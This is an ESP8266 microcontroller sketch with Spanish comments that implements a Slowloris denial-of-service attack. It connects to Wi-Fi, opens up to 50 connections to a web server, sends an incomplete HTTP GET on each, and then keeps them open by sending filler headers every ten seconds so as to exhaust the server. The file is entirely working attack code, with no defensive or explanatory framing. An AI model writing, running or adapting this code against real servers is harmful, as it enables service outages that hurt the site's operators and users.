#include <ESP8266WiFi.h>

// Configuración
const char* target_ip = "192.168.1.100"; // Dirección IP del servidor web
const int target_port = 80;              // Puerto HTTP (generalmente 80)
const int max_connections = 50;          // Número máximo de conexiones a abrir
const int delay_between_packets = 10;    // Tiempo entre envíos de datos (en segundos)

WiFiClient clients[max_connections];     // Array para almacenar las conexiones

void setup() {
  // Inicializa la comunicación serial
  Serial.begin(9600);
  Serial.println("Iniciando ataque Slowloris...");

  // Conecta el ESP8266 a una red Wi-Fi
  WiFi.begin("Tu_SSID", "Tu_Contraseña"); // Cambia por tus credenciales Wi-Fi
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\nConectado a la red Wi-Fi.");
}

void loop() {
  int active_connections = 0;

  // Intenta abrir nuevas conexiones
  for (int i = 0; i < max_connections; i++) {
    if (!clients[i].connected()) {
      if (clients[i].connect(target_ip, target_port)) {
        // Envía una solicitud HTTP parcial
        clients[i].print("GET / HTTP/1.1\r\n");
        clients[i].print("Host: ");
        clients[i].print(target_ip);
        clients[i].print("\r\n");
        clients[i].print("User-Agent: Slowloris\r\n");
        active_connections++;
        Serial.print("Conexión ");
        Serial.print(i + 1);
        Serial.println(" establecida.");
      } else {
        Serial.print("Error al establecer la conexión ");
        Serial.println(i + 1);
      }
    } else {
      active_connections++;
    }
  }

  // Mantiene las conexiones abiertas
  for (int i = 0; i < max_connections; i++) {
    if (clients[i].connected()) {
      // Envía un pequeño fragmento de datos para mantener la conexión
      clients[i].print("X-a: b\r\n");
    }
  }

  // Informa el número de conexiones activas
  Serial.print("Conexiones activas: ");
  Serial.println(active_connections);

  // Espera antes de repetir
  delay(delay_between_packets * 1000);
}
